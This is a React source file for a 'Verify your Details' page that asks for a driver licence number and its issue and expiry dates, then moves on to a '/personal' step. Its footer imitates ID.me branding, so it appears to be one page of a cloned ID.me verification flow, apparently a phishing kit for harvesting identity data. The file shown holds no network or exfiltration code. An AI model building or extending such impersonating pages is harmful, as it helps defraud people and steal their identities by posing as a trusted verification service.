import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";
import { useNavigate } from "react-router-dom";

const Verify = () => {
  const [currentErrorField, setCurrentErrorField] = useState(null);
  const navigate =useNavigate()
  const [errors, setErrors] = useState({
    licenseNumber: false,
    issueDate: false,
    expireDate: false,
  });

  const [formData, setFormData] = useState({
    licenseNumber: "",
    issueDate: null,
    expireDate: null,
  });

  const handleIssueDateChange = (date) => {
    setFormData((prev) => ({
      ...prev,
      issueDate: date,
    }));

    if (currentErrorField === 'issueDate') {
      setErrors((prev) => ({ ...prev, issueDate: !date }));
    }
  };

  const handleExpireDateChange = (date) => {
    setFormData((prev) => ({
      ...prev,
      expireDate: date,
    }));

    if (currentErrorField === 'expireDate') {
      setErrors((prev) => ({ ...prev, expireDate: !date }));
    }
  };

  const handleChange = (event) => {
    const { name, value } = event.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));

    if (currentErrorField === name) {
      setErrors((prev) => ({ ...prev, [name]: !value.trim() }));
    }
  };

  const validateField = (fieldName) => {
    let isValid = false;
    
    if (fieldName === 'licenseNumber') {
      isValid = formData.licenseNumber.trim() !== '';
    } else if (fieldName === 'issueDate') {
      isValid = formData.issueDate !== null;
    } else if (fieldName === 'expireDate') {
      isValid = formData.expireDate !== null;
    }

    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Check fields in order
    if (!validateField('licenseNumber')) {
      setCurrentErrorField('licenseNumber');
      return;
    }
    
    if (!validateField('issueDate')) {
      setCurrentErrorField('issueDate');
      return;
    }
    
    if (!validateField('expireDate')) {
      setCurrentErrorField('expireDate');
      return;
    }
    navigate("/personal")

    // If all fields are valid
    setCurrentErrorField(null);
    console.log('Form submitted:', formData);
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          Verify your Details
        </h1>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
        >
          {/* License Number */}
          <div className="w-full ">
            <label className="text-md font-semibold mb-2 block">Driver License Number</label>
            <input
              name="licenseNumber"
              type="text"
              value={formData.licenseNumber}
              onChange={handleChange}
              onBlur={() => currentErrorField === 'licenseNumber' && validateField('licenseNumber')}
              className={`w-full h-[65px] border-gray-500 px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.licenseNumber
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.licenseNumber && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Date of Issue */}
          <div className="w-full flex space-x-1">
            <label className="text-md font-semibold mb-2 block">Date of Issue</label>
            <DatePicker
              selected={formData.issueDate}
              onChange={handleIssueDateChange}
              onBlur={() => currentErrorField === 'issueDate' && validateField('issueDate')}
              name="issueDate"
              showMonthDropdown
              showYearDropdown
              dropdownMode="select"
              maxDate={new Date()}
              dateFormat="dd MM yyyy"
             
              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.issueDate
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.issueDate && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Date of Expiry */}
          <div className="w-full flex space-x-1">
            <label className="text-md font-semibold mb-2 block">Date of Expiry</label>
            <DatePicker
              selected={formData.expireDate}
              onChange={handleExpireDateChange}
              onBlur={() => currentErrorField === 'expireDate' && validateField('expireDate')}
              name="expireDate"
              showMonthDropdown
              showYearDropdown
              dropdownMode="select"
              minDate={new Date()} // Expiry date should be in future
              dateFormat="dd MM yyyy"
             
              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.expireDate
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.expireDate && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          <button
            type="submit"
            className="w-full py-3 sm:py-4 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-sm sm:text-lg"
          >
            Continue
          </button>
        </form>
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Verify;